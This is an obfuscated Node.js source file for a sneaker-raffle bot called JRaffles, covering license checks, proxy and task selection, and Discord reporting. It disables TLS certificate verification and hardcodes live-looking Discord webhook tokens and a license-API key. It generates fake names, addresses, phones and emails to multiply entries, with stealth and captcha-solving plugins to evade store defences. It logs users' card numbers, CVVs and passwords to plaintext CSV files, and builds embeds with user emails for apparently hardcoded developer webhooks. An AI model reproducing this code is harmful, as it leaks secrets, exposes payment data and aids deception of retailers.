process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x25647b = require('fs'), _0x2edf7d = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x354063(_0x7ee0c9) {
    const _0x46a331 = _0x25647b['createWriteStream'](_0x7ee0c9, { 'flags': 'a' }), _0x5e37d8 = console['log'];
    console['log'] = function () {
        const _0x8cf9d1 = Array['prototype']['slice']['call'](arguments), _0x12da34 = _0x8cf9d1['join']('\x20') + '\x0a';
        _0x46a331['write'](_0x12da34), _0x5e37d8['apply'](console, _0x8cf9d1);
    };
}
_0x354063('../logs/log\x20' + _0x2edf7d);
var _0x5bf540 = require('tough-cookie'), _0x117139 = require('node-imap'), _0xb1476b = require('util')['inspect'];
const _0x414931 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x4ee459 } = require('discord.js');
var _0x4d4fd9 = require('exe');
const { execFile: _0x41474b } = require('child_process'), _0x555941 = require('puppeteer-extra'), _0x243285 = require('puppeteer-extra-plugin-recaptcha'), _0x13dc37 = require('puppeteer-extra-plugin-stealth'), _0x49a6ed = require('chalk'), _0x9474bc = require('node-bash-title'), _0x20b5bc = require('axios'), _0x20cf77 = require('papaparse');
var _0x2af8af = require('random-name');
const _0xd1570a = require('request');
var _0x2da047 = require('prompt');
const _0x40bca5 = _0xd1570a['jar']();
var _0x2ab3b9 = {};
const _0x3153af = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0xda01fd = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x2e1283 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x291348 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0xd39973 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x363422 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x455b04 = 'https://discord.com/api/webhooks/', _0x32ae6a = '' + _0x455b04 + _0x2e1283, _0x46e741 = '' + _0x455b04 + _0x291348, _0x2b8095 = '' + _0x455b04 + _0x3153af, _0x3c02fa = '' + _0x455b04 + _0xda01fd, _0x595b38 = '' + _0x455b04 + _0xd39973, _0x2d4b5a = '' + _0x455b04 + _0x363422;
const _0x37c7dc = JSON['parse'](_0x25647b['readFileSync']('../package.json', 'utf-8')), _0xb0ce0a = _0x37c7dc['version'];
var _0x52153a, _0x2a2376, _0x5eb7b4, _0x25f70e, _0x4fda03, _0x1fc4ae, _0x484f45, _0x2afaf2;
const _0x45ae45 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x3bf944 = ![];
const _0x35add3 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x1d5fa7 = '0123456789';
var _0x1ca973 = _0x35add3['split']('');
const _0x4cd06a = require('auto-git-update'), _0x424cda = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x585d42 = new _0x4cd06a(_0x424cda);
async function _0x48544d() {
    _0x4fda03 = _0x25647b['readdirSync']('../proxies'), _0x25f70e = _0x25647b['readdirSync']('../tasks'), !_0x25647b['existsSync']('../accounts/fenom.csv') && _0x25647b['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x25647b['existsSync']('../accounts/paypal.csv') && _0x25647b['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x25647b['existsSync']('../accounts/bstn.csv') && _0x25647b['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x25647b['existsSync']('../accounts/eql.csv') && _0x25647b['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x25647b['existsSync']('../failed-tasks.csv') && _0x25647b['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x25647b['existsSync']('../successful-tasks.csv') && _0x25647b['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x2ab3b9 = JSON['parse'](_0x25647b['readFileSync']('../settings.json', 'utf-8')), !_0x2ab3b9['delay'] && (_0x2ab3b9['delay'] = 0x3c, _0x25647b['writeFileSync']('../settings.json', JSON['stringify'](_0x2ab3b9, null, 0x2))), !_0x2ab3b9['threads'] && (_0x2ab3b9['threads'] = 0x1, _0x25647b['writeFileSync']('../settings.json', JSON['stringify'](_0x2ab3b9, null, 0x2))), !_0x2ab3b9['masterMail'] && (_0x2ab3b9['masterMail'] = 'yourmail@gmail.com', _0x25647b['writeFileSync']('../settings.json', JSON['stringify'](_0x2ab3b9, null, 0x2))), !_0x2ab3b9['masterPassword'] && (_0x2ab3b9['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x25647b['writeFileSync']('../settings.json', JSON['stringify'](_0x2ab3b9, null, 0x2))), !_0x2ab3b9['captchaKey'] && (_0x2ab3b9['captchaKey'] = '', _0x25647b['writeFileSync']('../settings.json', JSON['stringify'](_0x2ab3b9, null, 0x2))), !_0x2ab3b9['useRandomProxy'] && (_0x2ab3b9['useRandomProxy'] = !![], _0x25647b['writeFileSync']('../settings.json', JSON['stringify'](_0x2ab3b9, null, 0x2))), !_0x2ab3b9['shuffleTasks'] && (_0x2ab3b9['shuffleTasks'] = ![], _0x25647b['writeFileSync']('../settings.json', JSON['stringify'](_0x2ab3b9, null, 0x2))), !_0x2ab3b9['webhook'] && (_0x2ab3b9['webhook'] = '', _0x25647b['writeFileSync']('../settings.json', JSON['stringify'](_0x2ab3b9, null, 0x2))), _0x2ab3b9['delay'] <= 0x1388 && (_0x2ab3b9['delay'] = _0x2ab3b9['delay'] * 0x3e8), _0x2ab3b9['AfewDelay'] && (delete _0x2ab3b9['AfewDelay'], _0x25647b['writeFileSync']('../settings.json', JSON['stringify'](_0x2ab3b9, null, 0x2))), _0x2ab3b9['MahaDelay'] && (delete _0x2ab3b9['MahaDelay'], _0x25647b['writeFileSync']('../settings.json', JSON['stringify'](_0x2ab3b9, null, 0x2))), _0x2ab3b9['footshopDelay'] && (delete _0x2ab3b9['footshopDelay'], _0x25647b['writeFileSync']('../settings.json', JSON['stringify'](_0x2ab3b9, null, 0x2))), _0x2ab3b9['MahaDelay'] = _0x2ab3b9['delay'], _0x455b04 = _0x2ab3b9['webhook'], _0x1fc4ae = _0x2ab3b9['licenseKey'];
}
let _0x4ee48b, _0x2c4b55 = [], _0x39d55d;
const _0x63aa6a = _0x58b388 => new Promise(_0x370c00 => setTimeout(_0x370c00, _0x58b388));
function _0x1b3c4f(_0x35af91, _0x438fdf) {
    return Math['floor'](Math['random']() * (_0x438fdf - _0x35af91 + 0x1) + _0x35af91);
}
function _0x243072(_0x39d4ed) {
    let _0x39cf46 = _0x39d4ed['length'], _0x153136;
    while (_0x39cf46 != 0x0) {
        _0x153136 = Math['floor'](Math['random']() * _0x39cf46), _0x39cf46--, [_0x39d4ed[_0x39cf46], _0x39d4ed[_0x153136]] = [
            _0x39d4ed[_0x153136],
            _0x39d4ed[_0x39cf46]
        ];
    }
    return _0x39d4ed;
}
async function _0x5cfba6(_0x51b8c8) {
    return _0x20b5bc['get']('https://api.hyper.co/v4/licenses/' + _0x51b8c8, { 'headers': { 'Authorization': 'Bearer\x20' + _0x45ae45 } })['then'](_0x4a2c1b => _0x4a2c1b['data'])['catch'](() => null);
}
;
async function _0x3ffb54(_0x5d572f) {
    console['clear']();
    if (_0x5d572f == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x3f079f = await _0x2da047['get']('License');
        if (_0x3f079f['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x63aa6a(0xbb8), _0x3ffb54(_0x5d572f);
        _0x5d572f = _0x3f079f['License'], _0x2ab3b9['licenseKey'] = _0x5d572f, _0x1fc4ae = _0x5d572f, _0x25647b['writeFileSync']('../settings.json', JSON['stringify'](_0x2ab3b9));
    }
    console['log']('Checking\x20license\x20' + _0x1fc4ae + '...'), await _0x63aa6a(0x320);
    const _0x340860 = await _0x5cfba6(_0x5d572f);
    _0x484f45 = JSON['stringify'](_0x340860['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x2afaf2 = JSON['stringify'](_0x340860['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x340860)
        return console['log']('License\x20not\x20found');
    if (!_0x340860['user'])
        return console['log']('License\x20not\x20bound');
    return _0x340860['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x3bf944 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x3bf944 = ![]);
}
async function _0x3734ab() {
    var _0x29d9f7 = await _0x2da047['get']('Module');
    return console['clear'](), _0x29d9f7['Module'];
}
;
async function _0x1fd500() {
    var _0x110b73 = await _0x2da047['get']('Setting');
    return console['clear'](), _0x110b73['Setting'];
}
async function _0x153974(_0x237ce2) {
    var _0x36a9cd = [];
    for (file of _0x25f70e) {
        var _0x543324 = _0x25647b['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x20cf77['parse'](_0x543324, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x237ce2['store'] && _0x36a9cd['push'](file);
    }
    !_0x36a9cd['length'] == 0x0 && (_0x25f70e = _0x36a9cd);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x35e931 = 0x0; _0x35e931 < _0x25f70e['length']; _0x35e931++) {
        console['log']('\x20(' + _0x35e931 + ')\x20' + _0x25f70e[_0x35e931]);
    }
    console['log']('');
    var _0x201418 = await _0x2da047['get']('Task');
    if (_0x201418['Task'] > _0x25f70e['length'] - 0x1 || isNaN(_0x201418['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x63aa6a(0x3e8), _0x153974();
    var _0x5838dd = _0x25647b['readFileSync']('../tasks/' + _0x25f70e[_0x201418['Task']], 'utf-8');
    return _0x5eb7b4 = _0x20cf77['parse'](_0x5838dd, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x49a6ed['blue'](_0x25f70e[_0x201418['Task']])), _0x52153a = _0x25f70e[_0x201418['Task']], _0x5eb7b4;
}
async function _0x422d6b() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x260133 = 0x0; _0x260133 < _0x4fda03['length']; _0x260133++) {
        console['log']('\x20(' + _0x260133 + ')\x20' + _0x4fda03[_0x260133]);
    }
    console['log']('');
    var _0x3b6386 = await _0x2da047['get']('Proxies');
    if (_0x3b6386['Proxies'] > _0x4fda03['length'] - 0x1 || isNaN(_0x3b6386['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x63aa6a(0x3e8), _0x422d6b();
    var _0x5af93d = _0x25647b['readFileSync']('../proxies/' + _0x4fda03[_0x3b6386['Proxies']], 'utf-8')['split']('\x0a');
    let _0x57547c = _0x5af93d['map']((_0xacc588, _0x54635b) => {
        sanatizeProxy = _0xacc588['replace']('\x0d', '');
        if (_0x5af93d[_0x54635b + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x2a2376 = _0x4fda03[_0x3b6386['Proxies']], console['clear'](), _0x57547c;
}
async function _0x39324a() {
    var _0xc56c95 = await _0x2da047['get']('Value');
    return console['clear'](), _0xc56c95['Value'];
}
async function _0x56d7ba(_0x4c2671) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x10a1b7 = 0x0; _0x10a1b7 < _0x4c2671['length']; _0x10a1b7++) {
        console['log']('\x20(' + _0x10a1b7 + ')\x20[' + _0x4c2671[_0x10a1b7]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x2cf39a = await _0x2da047['get']('Module');
    return _0x2cf39a['Module'];
}
async function _0x3570e5() {
    var _0x5a81a4 = await _0x2da047['get']('Password');
    return console['clear'](), _0x5a81a4['Password'];
}
;
async function _0x3dca3e() {
    var _0x4afa60 = await _0x2da047['get']('Links');
    return _0x4afa60['Links'];
}
;
async function _0x7f1ca8() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x304832 = 0x0; _0x304832 < _0x2c4b55['length']; _0x304832++) {
        console['log']('\x20(' + _0x304832 + ')\x20' + _0x2c4b55[_0x304832]);
    }
    ;
    console['log']();
    let _0x186519 = await _0x2da047['get']('Product');
    return console['clear'](), _0x186519['Product'];
}
;
function _0x2bc944() {
    var _0x24909f = new Date(Date['now']())['toLocaleTimeString']();
    return _0x24909f;
}
;
function _0x59dfb3() {
    var _0x29a40d = new Date(Date['now']())['toLocaleString']();
    return _0x29a40d['replace'](',', '');
}
async function _0x56185b(_0x226077, _0x473f9c) {
    let _0x1fbdb7 = { 'headers': { 'content-type': 'application/json' } };
    if (_0xb0ce0a != 'devkey') {
        await _0x20b5bc['post'](_0x226077, _0x473f9c, _0x1fbdb7);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x198507(_0x48d316, _0xaffb84, _0x11d4fe, _0x4034b5, _0x55a9a2) {
    if (!_0x4034b5 && _0x11d4fe == 'dev') {
        var _0x4af8de = new _0x4ee459()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0xaffb84['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0xaffb84['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x48d316['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x2ab3b9['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x484f45,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x48d316['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x48d316['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0xb0ce0a,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x4af8de['data'];
    } else {
        if (_0x4034b5 && _0x11d4fe == 'dev') {
            var _0x4af8de = new _0x4ee459()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0xaffb84['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x484f45,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0xaffb84['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x48d316['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x2ab3b9['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x55a9a2,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x48d316['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x48d316['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0xb0ce0a,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x4af8de['data'];
        } else {
            if (_0x11d4fe == 'pub') {
                var _0x4af8de = new _0x4ee459()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0xaffb84['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0xaffb84['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x48d316['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x2ab3b9['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x48d316['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0xb0ce0a,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x4af8de['data'];
            } else {
                if (_0x11d4fe == 'acc' && !_0x4034b5) {
                    var _0x4af8de = new _0x4ee459()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0xaffb84['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x484f45,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0xaffb84['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x2ab3b9['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0xb0ce0a,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x4af8de['data'];
                } else {
                    if (_0x11d4fe == 'acc' && _0x4034b5) {
                        var _0x4af8de = new _0x4ee459()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0xaffb84['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x484f45,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x55a9a2,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0xaffb84['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x2ab3b9['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0xb0ce0a,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x4af8de['data'];
                    } else {
                        if (_0x11d4fe == 'open') {
                            var _0x4af8de = new _0x4ee459()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x2afaf2)['addFields']({
                                'name': 'User',
                                'value': '' + _0x484f45,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0xb0ce0a,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x4af8de['data'];
                        } else {
                            if (!_0x4034b5 && _0x11d4fe == 'ver') {
                                var _0x4af8de = new _0x4ee459()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0xaffb84['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x484f45,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0xaffb84['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x2ab3b9['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0xb0ce0a,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x4af8de['data'];
                            } else {
                                if (_0x4034b5 && _0x11d4fe == 'ver') {
                                    var _0x4af8de = new _0x4ee459()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0xaffb84['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x484f45,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x55a9a2,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0xaffb84['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x2ab3b9['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0xb0ce0a,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x4af8de['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x5921e0(_0xfebbac, _0x5db6d7) {
    var _0x1ebbe6 = _0xfebbac[_0x5db6d7]['Address1']['split'](''), _0x182eb4 = _0xfebbac[_0x5db6d7]['Address2']['split'](''), _0x2ded4d = _0xfebbac[_0x5db6d7]['Email']['split']('@');
    for (var _0x2cc8bd = 0x0; _0x2cc8bd < _0x1ebbe6['length']; _0x2cc8bd++) {
        if (_0x1ebbe6[_0x2cc8bd] == 'X') {
            var _0x3acc79 = Math['round'](Math['random']() * (_0x35add3['length'] - 0x1));
            _0x1ebbe6[_0x2cc8bd] = _0x1ca973[_0x3acc79];
        }
    }
    ;
    for (var _0x2cc8bd = 0x0; _0x2cc8bd < _0x182eb4['length']; _0x2cc8bd++) {
        if (_0x182eb4[_0x2cc8bd] == 'X') {
            var _0x3acc79 = Math['round'](Math['random']() * (_0x35add3['length'] - 0x1));
            _0x182eb4[_0x2cc8bd] = _0x1ca973[_0x3acc79];
        }
    }
    ;
    _0xfebbac[_0x5db6d7]['FirstName']['toUpperCase']() == 'RANDOM' && (_0xfebbac[_0x5db6d7]['FirstName'] = _0x2af8af['first']());
    _0xfebbac[_0x5db6d7]['LastName']['toUpperCase']() == 'RANDOM' && (_0xfebbac[_0x5db6d7]['LastName'] = _0x2af8af['last']());
    _0x2ded4d[0x0]['toUpperCase']() == 'RANDOM' ? _0x2ded4d[0x0] = '' + _0x2af8af['first']() + _0x2af8af['last']() + _0x1b3c4f(0x1, 0x3e7) + '@' : _0x2ded4d[0x0] = _0x2ded4d[0x0] + '@';
    _0xfebbac[_0x5db6d7]['Email'] = _0x2ded4d['join'](''), _0xfebbac[_0x5db6d7]['Address1'] = _0x1ebbe6['join'](''), _0xfebbac[_0x5db6d7]['Address2'] = _0x182eb4['join']('');
    _0xfebbac[_0x5db6d7]['Phone'] == 'RANDOM' && (_0xfebbac[_0x5db6d7]['Phone'] = '0' + _0x1b3c4f(0x5f5e100, 0x3b9ac9ff));
    if (_0xfebbac[_0x5db6d7]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x175a85 = _0x1b3c4f(0x1, 0x270f);
        _0xfebbac[_0x5db6d7]['Follower'] = '' + _0x2af8af['first']() + _0x2af8af['last']() + _0x175a85 + '\x20';
    }
    _0xfebbac[_0x5db6d7]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0xfebbac[_0x5db6d7]['HouseNumber'] = _0x1b3c4f(0x1, 0xc8));
    if (_0xfebbac[_0x5db6d7]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0xbcb67d = Math['round'](Math['random']() * (_0x35add3['length'] - 0x1)), _0x2ce5e3 = _0x1ca973[_0xbcb67d];
        _0xfebbac[_0x5db6d7]['Address1'] = _0x2af8af['last']() + 'straat', _0xfebbac[_0x5db6d7]['Zip'] == '' && (_0xfebbac[_0x5db6d7]['Postcode'] = _0x1b3c4f(0x3e8, 0x270f) + '\x20' + _0x2ce5e3 + _0x2ce5e3, _0xfebbac[_0x5db6d7]['Zip'] = _0xfebbac[_0x5db6d7]['Postcode']), _0xfebbac[_0x5db6d7]['HouseNumber'] = '' + _0x1b3c4f(0x1, 0xc8);
    }
    return;
}
;
async function _0x11ea8b(_0x158210, _0x491b01) {
    _0x25647b['appendFileSync']('../failed-tasks.csv', _0x59dfb3() + ',' + _0x491b01['store'] + ',' + _0x491b01['name'] + ',' + _0x158210['Url'] + ',' + _0x158210['Size'] + ',' + _0x158210['Follower'] + ',' + _0x158210['FirstName'] + ',' + _0x158210['LastName'] + ',' + _0x158210['Address1'] + ',' + _0x158210['Address2'] + ',' + _0x158210['HouseNumber'] + ',' + _0x158210['Zip'] + ',' + _0x158210['City'] + ',' + _0x158210['State'] + ',' + _0x158210['Country'] + ',' + _0x158210['Phone'] + ',' + _0x158210['Email'] + ',' + _0x158210['Password'] + ',' + _0x158210['PaymentMethod'] + ',' + _0x158210['CardType'] + ',' + _0x158210['NameOnCard'] + ',' + _0x158210['CardNumber'] + ',' + _0x158210['ExpiryDate'] + ',' + _0x158210['CVV'] + ',' + _0x158210['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x1ab0d7(_0x4de720, _0x343932) {
    _0x25647b['appendFileSync']('../successful-tasks.csv', _0x59dfb3() + ',' + _0x343932['store'] + ',' + _0x343932['name'] + ',' + _0x4de720['Url'] + ',' + _0x4de720['Size'] + ',' + _0x4de720['Follower'] + ',' + _0x4de720['FirstName'] + ',' + _0x4de720['LastName'] + ',' + _0x4de720['Address1'] + ',' + _0x4de720['Address2'] + ',' + _0x4de720['HouseNumber'] + ',' + _0x4de720['Zip'] + ',' + _0x4de720['City'] + ',' + _0x4de720['State'] + ',' + _0x4de720['Country'] + ',' + _0x4de720['Phone'] + ',' + _0x4de720['Email'] + ',' + _0x4de720['Password'] + ',' + _0x4de720['PaymentMethod'] + ',' + _0x4de720['CardType'] + ',' + _0x4de720['NameOnCard'] + ',' + _0x4de720['CardNumber'] + ',' + _0x4de720['ExpiryDate'] + ',' + _0x4de720['CVV'] + ',' + _0x4de720['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x453230() {
    let _0x506519 = proxyFile['split']('\x0a'), _0x3b8854 = _0x506519['map']((_0x42c243, _0x328271) => {
        sanatizeProxy = _0x42c243['replace']('\x0d', '');
        if (_0x506519[_0x328271 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x3b8854;
}
;
async function _0x2121ae(_0x5d6a51, _0x23cf22) {
    if (_0x4257c2 != 'yes')
        var _0x4257c2 = '', _0x39bb4c = 0x0;
    async function _0xf6375a() {
        var _0x2f91bf = _0x25647b['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x9da999 = _0x20cf77['parse'](_0x2f91bf, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x4c65c5 = 0x0; _0x4c65c5 < _0x9da999['length']; _0x4c65c5++) {
            console['log']('(' + _0x4c65c5 + ')\x20' + _0x9da999[_0x4c65c5]['Email']);
        }
        console['log']('\x0a(' + _0x9da999['length'] + ')\x20' + _0x49a6ed['cyan']('Add\x20a\x20new\x20account'));
        let _0x5956ee = await _0x2da047['get']('Option');
        if (_0x5956ee['Option'] < _0x9da999['length'])
            return _0x9da999[_0x5956ee['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x389176 = {}, _0x152878 = await _0x2da047['get']('Email');
        _0x389176['Email'] = _0x152878['Email'];
